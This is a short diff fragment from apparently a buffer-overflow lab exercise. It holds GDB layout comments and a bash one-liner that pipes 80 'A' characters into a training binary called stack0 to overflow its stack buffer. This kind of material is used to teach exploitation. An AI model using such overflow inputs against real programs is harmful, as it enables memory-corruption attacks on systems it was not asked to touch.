@@ -9,6 +9,6 @@
 #if opened source code
 #Ctrl + x + a (source code)
 #enter layout asm (assembly code)
-
+.........
 #!/bin/bash 
 echo `python -c 'print"A"*80'` | ./stack0
